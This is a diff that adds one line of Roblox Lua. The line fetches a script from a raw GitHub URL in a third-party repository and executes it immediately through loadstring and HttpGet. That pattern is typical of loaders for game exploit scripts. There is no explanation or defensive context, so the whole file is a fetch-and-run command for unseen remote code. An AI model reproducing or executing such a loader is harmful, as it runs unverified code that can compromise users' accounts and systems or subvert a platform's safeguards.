@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/PP/refs/heads/main/PP%20Aq%20ne"))()
